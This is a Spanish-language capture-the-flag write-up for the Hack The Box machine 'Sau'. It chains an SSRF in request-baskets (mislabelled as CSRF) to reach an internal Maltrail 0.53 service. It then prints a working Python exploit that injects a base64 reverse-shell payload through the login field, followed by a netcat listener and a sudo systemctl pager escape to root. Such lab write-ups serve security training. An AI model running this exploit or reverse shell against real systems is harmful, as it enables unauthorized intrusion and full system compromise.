---
layout: single
title: Sau - Hack The Box
excerpt: "."
date: 2023-10-28
classes: wide
header:
  teaser: /assets/images/htb-writeup-sau/sau_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - LFI
  - RCE
  - CSRF
  - abuso sudoers
  - CVE-2023–27163
---


# PortScan
```
 nmap -p- --min-rate 5000 -vvv -Pn -n -sS 10.10.11.224 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-28 16:48 AST
Initiating SYN Stealth Scan at 16:48
Scanning 10.10.11.224 [65535 ports]
Discovered open port 22/tcp on 10.10.11.224
Discovered open port 55555/tcp on 10.10.11.224
Completed SYN Stealth Scan at 16:48, 14.11s elapsed (65535 total ports)
Nmap scan report for 10.10.11.224
Host is up, received user-set (0.070s latency).
Scanned at 2023-10-28 16:48:01 AST for 14s
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE REASON
22/tcp    open     ssh     syn-ack ttl 63
80/tcp    filtered http    no-response
8338/tcp  filtered unknown no-response
55555/tcp open     unknown syn-ack ttl 63
```

# Sitio Web

![](/assets/images/htb-writeup-sau/Pasted image 20231028164933.png)


Sí indagamos un poco en busca de vulnerabilidades, encontraremos qué esta versión de "**request-baskets**" es vulnerable a un (**CSRF**), [(CVE-2023–27163)](https://medium.com/@li_allouche/request-baskets-1-2-1-server-side-request-forgery-cve-2023-27163-2bab94f201f7), de manera qué podríamos aprovecharnos de esta vulnerabilidad para descubrir qué hay en el ":80" qué nos apareció como "filtered"


![](/assets/images/htb-writeup-sau/Pasted image 20231028165410.png)


Debemos tener todas las check's seleccionados, y en la URL indicar el localhost y que apunte al **:80**, esto para qué la misma máquina host apunte a su puerto & pueda visualizar que servicio corre en este puerto, probablemente un HTTP, ya qué exteriormente a lo mejor por reglas de "firewall" no podamos visualizar.


![](/assets/images/htb-writeup-sau/Pasted image 20231028165642.png)


Podemos ver que en el **":80"** está corriendo un **Mailtrail** con versión **0.53**, sí indagamos en busca de vulnerabilidades para este este aplicativo encontraremos qué podemos llevar a cabo un **RCE**, como sé explica en [éste artículo](https://securitylit.medium.com/exploiting-maltrail-v0-53-unauthenticated-remote-code-execution-rce-66d0666c18c5), y sí indagamos más encontraremos exploit para aprovecharnos de esta vulnerabilidad para otorgarnos una Reverse Shell, un script montado en python, a continuación se dejará el script utilizado.
```python
```py
import sys;
import os;
import base64;

def main():
	listening_IP = None
	listening_PORT = None
	target_URL = None

	if len(sys.argv) != 4:
		print("Error. Needs listening IP, PORT and target URL.")
		return(-1)
	
	listening_IP = sys.argv[1]
	listening_PORT = sys.argv[2]
	target_URL = sys.argv[3] + "/login"
	print("Running exploit on " + str(target_URL))
	curl_cmd(listening_IP, listening_PORT, target_URL)

def curl_cmd(my_ip, my_port, target_url):
	payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
	encoded_payload = base64.b64encode(payload.encode()).decode()  # encode the payload in Base64
	command = f"curl '{target_url}' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
	os.system(command)

if __name__ == "__main__":
  main()
```


Antes de llevar a cabo el script, nos ponemos en escucha con "netcat".
```
nc -nlvp 443
```

Para posterior a esto ejecutar el script con los parámetros indicados.
```
python3 exploit.py 10.10.14.116 443 http://10.10.11.224:55555/733up1m
```

Esto puede llevar un poco de tiempo, pero al cabo de un rato nos otorgará una reverse shell.


![](/assets/images/htb-writeup-sau/Pasted image 20231028170555.png)


# Escalada de Privilegios

Sí nos fijamos en nuestro permisos sudoers con:
```
sudo -l
```


![](/assets/images/htb-writeup-sau/Pasted image 20231028170807.png)

Veremos qué podemos ejecutar el binario **"systemctl status trail.service"** como todos los usuarios y sin proporcionar contraseñas, por ende podemos aprovecharnos de esto para ejecutar con sudo este binario & como está configurado no nos pedirá la credenciales del usuario actual, por lo qué tan sólo debemos poner el "sudo" delante del binario, es decir esto:

```
sudo systemctl status trail.service
```

Nos abrirá el binario como **Root**, y para aprovecharnos de esto debemos hacer como cuando usamos **vim** que nos abrimos el apartado para guardar, quitar, etcera, es decir "q" o "w", pero en vez de esto llamaremos una **tty**, ya sea una bash, sh o cualquiera otra, pero para esto debemos poner un signo de admiración hacia abajo y luego llamar la consola, como veremos a contiuación

![](/assets/images/htb-writeup-sau/Pasted image 20231028171134.png)


Posterior a ello obtendremos la tty indicada pero como Root.


![](/assets/images/htb-writeup-sau/Pasted image 20231028171815.png)
